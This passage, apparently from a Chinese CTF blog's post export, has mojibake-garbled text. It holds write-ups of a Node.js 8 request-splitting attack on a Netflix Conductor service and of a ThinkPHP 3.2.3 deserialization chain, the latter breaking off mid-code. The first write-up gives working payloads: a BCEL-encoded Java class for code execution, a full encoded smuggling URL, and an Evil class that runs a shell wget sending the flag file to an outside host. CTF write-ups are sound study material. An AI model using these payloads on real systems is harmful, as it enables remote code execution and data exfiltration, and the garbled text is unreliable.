c$b9$d2$feG$d3$oKq$r$3c$86$8d$f2$7fn$fb$X$f55$Y$7bb$3a$a5$D$c9$J$rU$f8t$H$B$f7$EJ$b0$e8K$f40$c0$f4$x$Q$c6$v$eaRl$d0$9a$df$fc$O$f6$DF$s2G$f4$e8$hb$ed$ad9$cc$hRE$91$40$8a$7e$ce$80C$baU$98$84$Rb$97$88$8fQ$c6D$9a$bcs$e4$99$a0L$K$c6$3d$B$b3$f0HC2J$7c$8a$U$bf$ab$Vh2$3do$c2$8d64C$oN$98$J$9b$cb$3e$A$83P$ba$98E$C$A$A&#39;).newInstance().class&#125;&quot;,&quot;retryCount&quot;: 3,&quot;retryLogic&quot;: &quot;FIXED&quot;,&quot;retryDelaySeconds&quot;:10, &quot;timeoutSeconds&quot;: 300,&quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;,&quot;responseTimeoutSeconds&quot;: 180&#125;,&#123;&quot;name&quot;: &quot;add_idents&quot;,&quot;retryCount&quot;: 3,&quot;retryLogic&quot;: &quot;FIXED&quot;,&quot;retryDelaySeconds&quot;: 10,&quot;timeoutSeconds&quot;: 300, &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;,&quot;responseTimeoutSeconds&quot;: 180&#125;] ä½†æˆ‘ä»¬ç°åœ¨çœ‹èµ·æ¥åªèƒ½åˆ©ç”¨/searchå‘10.0.85.9/api/metadata/taskdefså‘èµ·getè¯·æ±‚ï¼Œè™½ç„¶/searchä¸­å¯ä»¥å‘èµ·POSTè¯·æ±‚ï¼Œä½†æ˜¯å› ä¸ºå®é™…ä¸Šæˆ‘ä»¬æ˜¯é€šè¿‡/proxyè®¿é—®åˆ°/searchï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥è®¿é—®/search,å¯¼è‡´æˆ‘ä»¬æ— æ³•å‘/searchPOSTæ•°æ®ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡æ‹†åˆ†æ”»å‡»ï¼Œå‰é¢å·²ç»æœ‰æç¤ºï¼Œå°±æ˜¯saltçš„å€¼ï¼Œå¯ä»¥å¾—çŸ¥NodeJSç‰ˆæœ¬æ˜¯8ï¼Œè¿™ä¸ªç‰ˆæœ¬ï¼Œhttpåº“æœ‰æ¼æ´ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥å®ç°åœ¨getè¯·æ±‚ä¸­èµ°ç§ä¸€ä¸ªPOSTè¯·æ±‚è¾¾åˆ°ç›®çš„ å…·ä½“æ€ä¹ˆèµ°ç§ï¼Œçœ‹ä¾‹å­ åœ¨æ¯«æ— é˜²èŒƒçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡åœ¨è¯·æ±‚ä¸­æ³¨å…¥åè®®æ§åˆ¶å­—ç¬¦ï¼Œæ¯”å¦‚\\r\\nï¼Œæ–‡æœ¬åè®®æ˜¯è„†å¼±çš„ï¼Œå½“æ³¨å…¥çš„åè®®æ§åˆ¶ç¬¦å¯ä»¥ç”Ÿæ•ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å®Œå…¨æ§åˆ¶è¿™ä¸ªè¯·æ±‚ï¼Œæ¯”å¦‚æå‰ç»™å‡ºè¯·æ±‚çš„ç»“æŸæ ‡å¿—ï¼Œåœ¨ç»“æŸåé™„åŠ å¦ä¸€ä¸ªè¯·æ±‚ï¼ˆæ¯”å¦‚ä¸€ä¸ªPOSTè¯·æ±‚ï¼‰ï¼Œå°±å®ç°äº†é™„åŠ è¯·æ±‚ï¼Œä¹Ÿæ­£æ˜¯æˆ‘ä»¬ç°åœ¨éœ€è¦å®Œæˆçš„ 12GET &#x2F;index.php?a&#x3D;1 HTTP&#x2F;1.1... è¯·æ±‚?a=1 HTTP/1.1\\r\\n\\r\\nPOST /index.php HTTP/1.1\\r\\nContent-Length:10\\r\\nContent-Type:application/json\\r\\n\\r\\n xxxxxxxxxx ç„¶åè¯·æ±‚å°±å˜æˆäº† 1234567GET &#x2F;index.php?a&#x3D;1 HTTP&#x2F;1.1POST &#x2F;index.php HTTP&#x2F;1.1Content-Length:10Content-Type:application&#x2F;textxxxxxxxxxx ä½†é€šå¸¸çš„httpåº“ä¼šé˜»æ­¢è¿™æ ·çš„è¡Œä¸ºï¼ŒNode.jså½“ç„¶ä¹Ÿä¼šé˜»æ­¢ï¼Œå½“ä½ çš„è¯·æ±‚è·¯å¾„å­˜åœ¨åè®®æ§åˆ¶å­—ç¬¦ï¼Œä¼šè‡ªåŠ¨è¿›è¡Œurlç¼–ç ï¼Œä½¿å…¶å¤±å»ä½œç”¨ ä½†æ˜¯å¦‚æœä½¿ç”¨unicodeå­—ç¬¦ï¼Œåœ¨NodeJS8ç‰ˆæœ¬ä¹‹å‰ï¼Œä¸ä¼šå¯¹å…¶è¿›è¡Œurlç¼–ç ï¼Œè€Œä¸”ç”±äºNode.jsä½¿ç”¨Latin1ï¼Œè¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç ï¼Œå®ƒå¯¹Unicodeå­—ç¬¦çš„å¤„ç†æ˜¯ï¼Œæˆªå–ä½å­—èŠ‚éƒ¨åˆ†ä½œä¸ºè¿™ä¸ªå­—ç¬¦çš„ç¼–ç  æ¯”å¦‚\\u&#123;010A&#125;å°±ä¼šè¢«æˆªå–æˆ\\0Aï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å°†åè®®æ§åˆ¶å­—ç¬¦æ’å…¥è¯·æ±‚ä¸­ 0x05 æ„é€ payloadå‚è€ƒäº†å¤§ä½¬çš„wpï¼Œå€Ÿç”¨äº†è„šæœ¬ï¼Œæ”¹ä¸€ä¸‹payload 12post_payload = &#x27;[\\u&#123;017b&#125;\\u&#123;0122&#125;name\\u&#123;0122&#125;:\\u&#123;0122&#125;$\\u&#123;017b&#125;\\u&#123;0127&#125;1\\u&#123;0127&#125;.getClass().forName(\\u&#123;0127&#125;com.sun.org.apache.bcel.internal.util.ClassLoader\\u&#123;0127&#125;).newInstance().loadClass(\\u&#123;0127&#125;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5bO$TA$Y$3d$b3$dd$eel$97$c5$96$o$I$5e$a0$80$97$ad$97n$8b$Y$T$f0$f2$60$e0i$V$c2$SM$e3$L$d3u$y$83$ed$b6$d9N$81$7f$e43$_bL$f4$H$f8$a3$d4o6F$bcM2$t$dfw$be$cb$9c$9c$f9$fa$ed$d3$X$Ak$a8$7b$98$c0$r$8e9$X$f3$$$$$bb$b8$e2$e1$w$ae$ZX$e0X$f4$e0$a2$c6$b1$c4$b1$cc$e0$3cR$a9$d2O$Y$KA$fd$r$83$fdl$f0F2$94$p$95$ca$X$e3$7eGf$7b$a2$d3$pf2$d6$oy$f7$5c$M$f3$3c$9f$5e$a4$f6$beP$v$c3l$f0$3a$3a$UG$o$ec$89$b4$h$c6$3aSiw$c3$ac$f3$e2$c18K$e4$962$xJ$9bG$aa$d70$7d$3e$7cL2T$fe$9ea$e0aG$a5$e1$e8$80$c1$ba$970$dc$3d$eeJ$5d$3b$d0z$b8$k$86$ad$d5V$e3$fe$c3F$ab$d9X$7d$b0$b6$dej6$9bO$c5$e3$fdD$e8Z$f8$b6$t$ba$fb$i$x$3e$ae$e3$86$8f$9b$b8$c50$7d$be$7d$f3$q$91C$ad$G$a9$8f$c0$3cl$h$r$7f$bc$bf$dd9$94$89f$98$3a$a7v$c7$a9V$7d$d2$ed$91$86_$c9LP$8f$fe$e9$d9$a0$95$f2D$92$e0$e0$bfN$fcF$edd$83D$8eF4Q$kRQ$e7$b6$eee$o$91X$82$f97s$y0$e3$Q$e1$F$ca$8ea$T$D$d4o$9f$819$9fa$b5$L$d5B$dc$b6$abv$dc$$V$8bq$f4$R$ce$9d$P$e0$af$de$c3$8d$u$u$9d$d2$a0$8d$gV$e8$a3$z$94it$B$9c$b0$40l$Rsp$a8V$a2$w$t$b7$5cr$c4C$85$aa$VX$df$89d$iS$G$aa6$f5L$e3$e2O$R$f3t$99$b9$a7y$60$96$3a9$e1$T$ce$e4$9ag$7f$A$94B$cd$d5$81$C$A$A\\u&#123;0127&#125;).newInstance().class\\u&#123;017d&#125;\\u&#123;0122&#125;,\\u&#123;0122&#125;ownerEmail\\u&#123;0122&#125;:\\u&#123;0122&#125;test@example.org\\u&#123;0122&#125;,\\u&#123;0122&#125;retryCount\\u&#123;0122&#125;:\\u&#123;0122&#125;3\\u&#123;0122&#125;,\\u&#123;0122&#125;timeoutSeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;1200\\u&#123;0122&#125;,\\u&#123;0122&#125;inputKeys\\u&#123;0122&#125;:[\\u&#123;0122&#125;sourceRequestId\\u&#123;0122&#125;,\\u&#123;0122&#125;qcElementType\\u&#123;0122&#125;],\\u&#123;0122&#125;outputKeys\\u&#123;0122&#125;:[\\u&#123;0122&#125;state\\u&#123;0122&#125;,\\u&#123;0122&#125;skipped\\u&#123;0122&#125;,\\u&#123;0122&#125;result\\u&#123;0122&#125;],\\u&#123;0122&#125;timeoutPolicy\\u&#123;0122&#125;:\\u&#123;0122&#125;TIME_OUT_WF\\u&#123;0122&#125;,\\u&#123;0122&#125;retryLogic\\u&#123;0122&#125;:\\u&#123;0122&#125;FIXED\\u&#123;0122&#125;,\\u&#123;0122&#125;retryDelaySeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;600\\u&#123;0122&#125;,\\u&#123;0122&#125;responseTimeoutSeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;3600\\u&#123;0122&#125;,\\u&#123;0122&#125;concurrentExecLimit\\u&#123;0122&#125;:\\u&#123;0122&#125;100\\u&#123;0122&#125;,\\u&#123;0122&#125;rateLimitFrequencyInSeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;60\\u&#123;0122&#125;,\\u&#123;0122&#125;rateLimitPerFrequency\\u&#123;0122&#125;:\\u&#123;0122&#125;50\\u&#123;0122&#125;,\\u&#123;0122&#125;isolationgroupId\\u&#123;0122&#125;:\\u&#123;0122&#125;myIsolationGroupId\\u&#123;0122&#125;\\u&#123;017d&#125;]&#x27;console.log(encodeURI(encodeURI(encodeURI(&#x27;http://0.0.0.0:3000/\\u&#123;0120&#125;HTTP/1.1\\u&#123;010D&#125;\\u&#123;010A&#125;Host:127.0.0.1:3000\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;POST\\u&#123;0120&#125;/search?url=http://10.0.85.9:8080/api/metadata/taskdefs\\u&#123;0120&#125;HTTP/1.1\\u&#123;010D&#125;\\u&#123;010A&#125;Host:127.0.0.1:3000\\u&#123;010D&#125;\\u&#123;010A&#125;Content-Type:application/json\\u&#123;010D&#125;\\u&#123;010A&#125;Content-Length:&#x27; + post_payload.length + &#x27;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;&#x27; + post_payload+ &#x27;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;GET\\u&#123;0120&#125;/private&#x27;)))) 123è®°å½•è¿›è·¯å¾„çš„æ—¶å€™ä½¿ç”¨çš„Latin1ç¼–ç ï¼Œä¸Šé¢æ‰€æœ‰unicodeç¼–ç åªä¼šè¢«æˆªæ–­ä¸€ä¸ªå­—èŠ‚getè¯·æ±‚ç»“æŸç”¨ä¸¤ä¸ªæ¢è¡Œï¼Œpostå››ä¸ªæ¢è¡Œä¸‰æ¬¡URIç¼–ç æ˜¯å¯¹åº”æœåŠ¡ç«¯çš„ä¸¤æ¬¡URIè§£ç å—ï¼ŸçŒœæµ‹ï¼šä¸¤æ¬¡è§£ç æ˜¯ä¸ºäº†è§£å†³urlä¼ é€’çš„é—®é¢˜ï¼Œå¯¹unicodeå­—ç¬¦åšä¸€æ¬¡uriç¼–ç å°±å¯ä»¥å°†éasciiå­—ç¬¦è½¬åŒ–ï¼Œæ–¹ä¾¿ä¼ é€’ï¼Œç„¶åå†ç¼–ç ä¸€æ¬¡ï¼Œè¿™ä¸€æ¬¡ç¼–ç ä¸å­˜åœ¨unicodeå­—ç¬¦ï¼Œä¸ºäº†åº”å¯¹åç«¯æœåŠ¡å™¨è¿›è¡Œçš„éutf-8çš„ä¸€æ¬¡è§£ç ï¼Œä¹‹ååç«¯å†è¿›è¡Œä¸€æ¬¡utf-8çš„è§£ç å³å¯å¾—åˆ°åŸæ¥unicodeå­—ç¬¦ ç”Ÿæˆçš„payload 1http:&#x2F;&#x2F;0.0.0.0:3000&#x2F;%2525C4%2525A0HTTP&#x2F;1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258APOST%2525C4%2525A0&#x2F;search?url&#x3D;http:&#x2F;&#x2F;10.0.85.9:8080&#x2F;api&#x2F;metadata&#x2F;taskdefs%2525C4%2525A0HTTP&#x2F;1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258AContent-Type:application&#x2F;json%2525C4%25258D%2525C4%25258AContent-Length:1629%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%25255B%2525C5%2525BB%2525C4%2525A2name%2525C4%2525A2:%2525C4%2525A2$%2525C5%2525BB%2525C4%2525A71%2525C4%2525A7.getClass().forName(%2525C4%2525A7com.sun.org.apache.bcel.internal.util.ClassLoader%2525C4%2525A7).newInstance().loadClass(%2525C4%2525A7$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5bO$TA$Y$3d$b3$dd$eel$97$c5$96$o$I$5e$a0$80$97$ad$97n$8b$Y$T$f0$f2$60$e0i$V$c2$SM$e3$L$d3u$y$83$ed$b6$d9N$81$7f$e43$_bL$f4$H$f8$a3$d4o6F$bcM2$t$dfw$be$cb$9c$9c$f9$fa$ed$d3$X$Ak$a8$7b$98$c0$r$8e9$X$f3$$$$$bb$b8$e2$e1$w$ae$ZX$e0X$f4$e0$a2$c6$b1$c4$b1$cc$e0$3cR$a9$d2O$Y$KA$fd$r$83$fdl$f0F2$94$p$95$ca$X$e3$7eGf$7b$a2$d3$pf2$d6$oy$f7$5c$M$f3$3c$9f$5e$a4$f6$beP$v$c3l$f0$3a$3a$UG$o$ec$89$b4$h$c6$3aSiw$c3$ac$f3$e2$c18K$e4$962$xJ$9bG$aa$d70$7d$3e$7cL2T$fe$9ea$e0aG$a5$e1$e8$80$c1$ba$970$dc$3d$eeJ$5d$3b$d0z$b8$k$86$ad$d5V$e3$fe$c3F$ab$d9X$7d$b0$b6$dej6$9bO$c5$e3$fdD$e8Z$f8$b6$t$ba$fb$i$x$3e$ae$e3$86$8f$9b$b8$c50$7d$be$7d$f3$q$91C$ad$G$a9$8f$c0$3cl$h$r$7f$bc$bf$dd9$94$89f$98$3a$a7v$c7$a9V$7d$d2$ed$91$86_$c9LP$8f$fe$e9$d9$a0$95$f2D$92$e0$e0$bfN$fcF$edd$83D$8eF4Q$kRQ$e7$b6$eee$o$91X$82$f97s$y0$e3$Q$e1$F$ca$8ea$T$D$d4o$9f$819$9fa$b5$L$d5B$dc$b6$abv$dc$$V$8bq$f4$R$ce$9d$P$e0$af$de$c3$8d$u$u$9d$d2$a0$8d$gV$e8$a3$z$94it$B$9c$b0$40l$Rsp$a8V$a2$w$t$b7$5cr$c4C$85$aa$VX$df$89d$iS$G$aa6$f5L$e3$e2O$R$f3t$99$b9$a7y$60$96$3a9$e1$T$ce$e4$9ag$7f$A$94B$cd$d5$81$C$A$A%2525C4%2525A7).newInstance().class%2525C5%2525BD%2525C4%2525A2,%2525C4%2525A2ownerEmail%2525C4%2525A2:%2525C4%2525A2test@example.org%2525C4%2525A2,%2525C4%2525A2retryCount%2525C4%2525A2:%2525C4%2525A23%2525C4%2525A2,%2525C4%2525A2timeoutSeconds%2525C4%2525A2:%2525C4%2525A21200%2525C4%2525A2,%2525C4%2525A2inputKeys%2525C4%2525A2:%25255B%2525C4%2525A2sourceRequestId%2525C4%2525A2,%2525C4%2525A2qcElementType%2525C4%2525A2%25255D,%2525C4%2525A2outputKeys%2525C4%2525A2:%25255B%2525C4%2525A2state%2525C4%2525A2,%2525C4%2525A2skipped%2525C4%2525A2,%2525C4%2525A2result%2525C4%2525A2%25255D,%2525C4%2525A2timeoutPolicy%2525C4%2525A2:%2525C4%2525A2TIME_OUT_WF%2525C4%2525A2,%2525C4%2525A2retryLogic%2525C4%2525A2:%2525C4%2525A2FIXED%2525C4%2525A2,%2525C4%2525A2retryDelaySeconds%2525C4%2525A2:%2525C4%2525A2600%2525C4%2525A2,%2525C4%2525A2responseTimeoutSeconds%2525C4%2525A2:%2525C4%2525A23600%2525C4%2525A2,%2525C4%2525A2concurrentExecLimit%2525C4%2525A2:%2525C4%2525A2100%2525C4%2525A2,%2525C4%2525A2rateLimitFrequencyInSeconds%2525C4%2525A2:%2525C4%2525A260%2525C4%2525A2,%2525C4%2525A2rateLimitPerFrequency%2525C4%2525A2:%2525C4%2525A250%2525C4%2525A2,%2525C4%2525A2isolationgroupId%2525C4%2525A2:%2525C4%2525A2myIsolationGroupId%2525C4%2525A2%2525C5%2525BD%25255D%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258AGET%2525C4%2525A0&#x2F;private æœ€åæ³¨æ„ä¸€ç‚¹ï¼ŒJava Runtime.getRuntime().execåœ¨æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™æ— æ³•è§£é‡Šä¸€äº›ç‰¹æ®Šç¬¦å·ï¼Œæ¯”å¦‚&amp;,`,|ç­‰ç­‰ï¼Œå¯ä»¥ç”¨ä¸¤ç§æ–¹å¼è§£å†³ ç¬¬ä¸€ï¼Œhttp://www.jackson-t.ca/runtime-exec-payloads.html æŠŠå‘½ä»¤ç¼–ç ä¸€ä¸‹ ç¬¬äºŒï¼Œä¼ å…¥æ•°ç»„ 12345678910111213public class Evil&#123; public Evil()&#123; try&#123; String[] command = &#123; &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;wget http://vps:port?a=`cat /flag`&quot;&#125;; Runtime.getRuntime().exec(command); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(final String[]array)&#123; &#125;&#125; è¿™é‡Œè§£é‡Šäº†ç‰¹æ®Šç¬¦å·`æ˜¯å› ä¸ºè°ƒç”¨äº†shï¼Œæ˜¯shè§£é‡Šäº†ç‰¹æ®Šç¬¦å·","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"Nodejs","slug":"CTF/Nodejs","permalink":"https://123-prog.github.io/categories/CTF/Nodejs/"}],"tags":[{"name":"nodejsä»£ç å®¡è®¡","slug":"nodejsä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/tags/nodejs%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"Netflix Conductor 1day","slug":"Netflix-Conductor-1day","permalink":"https://123-prog.github.io/tags/Netflix-Conductor-1day/"},{"name":"Java BCEL ç¼–ç ","slug":"Java-BCEL-ç¼–ç ","permalink":"https://123-prog.github.io/tags/Java-BCEL-%E7%BC%96%E7%A0%81/"},{"name":"nodejsè¯·æ±‚èµ°ç§","slug":"nodejsè¯·æ±‚èµ°ç§","permalink":"https://123-prog.github.io/tags/nodejs%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"}]},{"title":"çº¢æ˜è°·CTF 2021 EasyTP","slug":"çº¢æ˜è°·CTF-2021-EasyTP","date":"2021-07-07T04:50:12.000Z","updated":"2021-09-22T09:54:12.021Z","comments":true,"path":"2021/07/07/çº¢æ˜è°·CTF-2021-EasyTP/","link":"","permalink":"https://123-prog.github.io/2021/07/07/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/","excerpt":"0x01www.zipè·å¾—æºç ï¼ŒæŸ¥çœ‹tpç‰ˆæœ¬ ./ThinkPHP/ThinkPHP.php","text":"0x01www.zipè·å¾—æºç ï¼ŒæŸ¥çœ‹tpç‰ˆæœ¬ ./ThinkPHP/ThinkPHP.php 123456789101112131415161718192021222324252627&lt;?php// +----------------------------------------------------------------------// | ThinkPHP [ WE CAN DO IT JUST THINK IT ]// +----------------------------------------------------------------------// | Copyright (c) 2006-2014 http://thinkphp.cn All rights reserved.// +----------------------------------------------------------------------// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )// +----------------------------------------------------------------------// | Author: liu21st &lt;liu21st@gmail.com&gt;// +----------------------------------------------------------------------//----------------------------------// ThinkPHPå…¬å…±å…¥å£æ–‡ä»¶//----------------------------------// è®°å½•å¼€å§‹è¿è¡Œæ—¶é—´$GLOBALS[&#x27;_beginTime&#x27;] = microtime(true);// è®°å½•å†…å­˜åˆå§‹ä½¿ç”¨define(&#x27;MEMORY_LIMIT_ON&#x27;, function_exists(&#x27;memory_get_usage&#x27;));if (MEMORY_LIMIT_ON) &#123; $GLOBALS[&#x27;_startUseMems&#x27;] = memory_get_usage();&#125;// ç‰ˆæœ¬ä¿¡æ¯const THINK_VERSION = &#x27;3.2.3&#x27;;...... å¯ä»¥çœ‹åˆ°ç‰ˆæœ¬æ˜¯3.2.3 ./Application/Home/Controller/IndexController.class.php 123456789101112131415&lt;?phpnamespace Home\\Controller;use Think\\Controller;classIndexController extends Controller &#123; public function index()&#123; echo(unserialize(base64_decode(file_get_contents(&#x27;php://input&#x27;)))); $this-&gt;display(); &#125; public function test()&#123; echo(unserialize(base64_decode(file_get_contents(&#x27;php://input&#x27;)))); &#125;&#125; å¯ä»¥çœ‹åˆ°æ˜¯phpçš„ååºåˆ—åŒ–æ¼æ´ æ‰¾ä¸€ä¸‹è¿™ä¸ªç‰ˆæœ¬å¯¹åº”å­˜åœ¨çš„ä¸€äº›æ¼æ´ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç½‘ä¸Šæ‰¾åˆ°çš„å¯ç”¨çš„popé“¾ 0x02 popé“¾é¦–å…ˆï¼Œå…¨å±€æœç´¢__destruct()ä½œä¸ºååºåˆ—åŒ–åˆ©ç”¨çš„èµ·ç‚¹ åœ¨æ–‡ä»¶/ThinkPHP/Library/Think/Image/Driver/Imagick.class.phpå¤„ 1234567/** * ææ„æ–¹æ³•ï¼Œç”¨äºé”€æ¯å›¾åƒèµ„æº */ public function __destruct() &#123; empty($this-&gt;img) || $this-&gt;img-&gt;destroy(); &#125; è¿™æ˜¯ä¸€ä¸ªé”€æ¯å›¾åƒçš„ææ„å‡½æ•°ï¼Œè¿™é‡Œçš„imgä½œä¸ºç±»çš„æˆå‘˜å…¶å®æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥çš„ç›®æ ‡æ˜¯å¯»æ‰¾ä¸€ä¸ªå¯åˆ©ç”¨ç±»ï¼Œè¿™ä¸ªç±»æ‹¥æœ‰destroy()æ–¹æ³•ï¼Œä¸”éœ€è¦çš„å‚æ•°å¯æ§ å…¨å±€æœç´¢destroy() åœ¨æ–‡ä»¶/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php 123456789** * åˆ é™¤Session * @access public * @param string $sessID */ public function destroy($sessID) &#123; return $this-&gt;handle-&gt;delete($this-&gt;sessionName . $sessID); &#125; è¿™é‡Œæœ‰å‚æ•°ï¼Œä½†php5å…è®¸è¿™ç§æƒ…å†µå‡ºç°ï¼Œå¯ä»¥æ— å‚è°ƒç”¨ä¸æŠ¥é”™ ç®€å•çœ‹ä¸€ä¸‹ï¼Œå‘ç°handleå‚æ•°å¯æ§ å…¨å±€æœç´¢delete()æ–¹æ³• åœ¨æ–‡ä»¶/ThinkPHP/Library/Think/Model.class.phpä¸­ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273/** * åˆ é™¤æ•°æ® * @access public * @param mixed $options è¡¨è¾¾å¼ * @return mixed */public function delete($options = array())&#123; $pk = $this-&gt;getPk(); if (empty($options) &amp;&amp; empty($this-&gt;options[&#x27;where&#x27;])) &#123; // å¦‚æœåˆ é™¤æ¡ä»¶ä¸ºç©º åˆ™åˆ é™¤å½“å‰æ•°æ®å¯¹è±¡æ‰€å¯¹åº”çš„è®°å½• if (!empty($this-&gt;data) &amp;&amp; isset($this-&gt;data[$pk])) &#123; return $this-&gt;delete($this-&gt;data[$pk]); &#125; else &#123; return false; &#125; &#125; if (is_numeric($options) || is_string($options)) &#123; // æ ¹æ®ä¸»é”®åˆ é™¤è®°å½• if (strpos($options, &#x27;,&#x27;)) &#123; $where[$pk] = array(&#x27;IN&#x27;, $options); &#125; else &#123; $where[$pk] = $options; &#125; $options = array(); $options[&#x27;where&#x27;] = $where; &#125; // æ ¹æ®å¤åˆä¸»é”®åˆ é™¤è®°å½• if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) &#123; $count = 0; foreach (array_keys($options) as $key) &#123; if (is_int($key)) &#123; $count++; &#125; &#125; if (count($pk) == $count) &#123; $i = 0; foreach ($pk as $field) &#123; $where[$field] = $options[$i]; unset($options[$i++]); &#125; $options[&#x27;where&#x27;] = $where; &#125; else &#123; return false; &#125; &#125; // åˆ†æè¡¨è¾¾å¼ $options = $this-&gt;_parseOptions($options); if (empty($options[&#x27;where&#x27;])) &#123; // å¦‚æœæ¡ä»¶ä¸ºç©º ä¸è¿›è¡Œåˆ é™¤æ“ä½œ é™¤éè®¾ç½® 1=1 return false; &#125; if (is_array($options[&#x27;where&#x27;]) &amp;&amp; isset($options[&#x27;where&#x27;][$pk])) &#123; $pkValue = $options[&#x27;where&#x27;][$pk]; &#125; if (false === $this-&gt;_before_delete($options)) &#123; return false; &#125; $result = $this-&gt;db-&gt;delete($options); if (false !== $result &amp;&amp; is_numeric($result)) &#123; $data = array(); if (isset($pkValue)) &#123; $data[$pk] = $pkValue; &#125; $this-&gt;_after_delete($data, $options); &#125; // è¿”å›åˆ é™¤è®°å½•ä¸ªæ•° return $result;&#125; ä¸»è¦åˆ†æè¿™ä¸€éƒ¨åˆ† 123456789101112public function delete($options = array()) &#123; $pk = $this-&gt;getPk(); if (empty($options) &amp;&amp; empty($this-&gt;options[&#x27;where&#x27;])) &#123; // å¦‚æœåˆ é™¤æ¡ä»¶ä¸ºç©º åˆ™åˆ é™¤å½“å‰æ•°æ®å¯¹è±¡æ‰€å¯¹åº”çš„è®°å½• if (!empty($this-&gt;data) &amp;&amp; isset($this-&gt;data[$pk])) &#123; return $this-&gt;delete($this-&gt;data[$pk]); &#125; else &#123; return false; &#125; &#125; $this-&gt;pkæ˜¯å¯æ§çš„ï¼Œ$optionsæ˜¯ä»ä¸Šä¸€ä¸ªè·³æ¿ç±»ä¸­ä¼ è¿‡æ¥çš„ï¼Œçœ‹ä¸€ä¸‹ï¼Œæˆ‘ä»¬åªèƒ½æ§åˆ¶ä¼ è¿‡æ¥ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„å€¼ï¼Œæˆ–è€…ä¸ä¼ ï¼Œè¿™é‡Œé€‰æ‹©ä¸ä¼ ï¼Œåœ¨ä¸‹é¢çœ‹åˆ°è¿™ä¹ˆå…³é”®çš„ä¸€è¡Œreturn $this-&gt;delete($this-&gt;data[$pk]);è¿™é‡Œæ˜¯é€’å½’è°ƒç”¨ï¼Œ$this-&gt;data[$pk]å˜æˆäº†æˆ‘ä»¬å¯æ§çš„å‚æ•° !empty($this-&gt;data) &amp;&amp; isset($this-&gt;data[$pk])è¿™ä¸ªæ¡ä»¶ä¹Ÿå®Œå…¨åœ¨æˆ‘ä»¬æ§åˆ¶ä¹‹ä¸‹ï¼Œæ‰€ä»¥å¯è¡Œ ç»•è¿™ä¹ˆä¸€ä¸‹ä¹‹åå°±å¯ä»¥æ‰§è¡Œå¯æ§å‚æ•°çš„delete() åœ¨ä¸‹é¢å‘ç°ï¼Œdelete()çš„å®é™…è°ƒç”¨ 1$result &#x3D; $this-&gt;db-&gt;delete($options); æ‰€ä»¥æœ€ç»ˆçš„è°ƒç”¨æ˜¯æ–‡ä»¶/ThinkPHP/Library/Think/Db/Driver.class.phpä¸­çš„delete() 12345678910111213141516171819202122public function delete($options = array()) &#123; $this-&gt;model = $options[&#x27;model&#x27;]; $this-&gt;parseBind(!empty($options[&#x27;bind&#x27;]) ? $options[&#x27;bind&#x27;] : array()); $table = $this-&gt;parseTable($options[&#x27;table&#x27;]); $sql = &#x27;DELETE FROM &#x27; . $table; if (strpos($table, &#x27;,&#x27;)) &#123;// å¤šè¡¨åˆ é™¤æ”¯æŒUSINGå’ŒJOINæ“ä½œ if (!empty($options[&#x27;using&#x27;])) &#123; $sql .= &#x27; USING &#x27; . $this-&gt;parseTable($options[&#x27;using&#x27;]) . &#x27; &#x27;; &#125; $sql .= $this-&gt;parseJoin(!empty($options[&#x27;join&#x27;]) ? $options[&#x27;join&#x27;] : &#x27;&#x27;); &#125; $sql .= $this-&gt;parseWhere(!empty($options[&#x27;where&#x27;]) ? $options[&#x27;where&#x27;] : &#x27;&#x27;); if (!strpos($table, &#x27;,&#x27;)) &#123; // å•è¡¨åˆ é™¤æ”¯æŒorderå’Œlimit $sql .= $this-&gt;parseOrder(!empty($options[&#x27;order&#x27;]) ? $options[&#x27;order&#x27;] : &#x27;&#x27;) . $this-&gt;parseLimit(!empty($options[&#x27;limit&#x27;]) ? $options[&#x27;limit&#x27;] : &#x27;&#x27;); &#125; $sql .= $this-&gt;parseComment(!empty($options[&#x27;comment&#x27;]) ? $options[&#x27;comment&#x27;] : &#x27;&#x27;); return 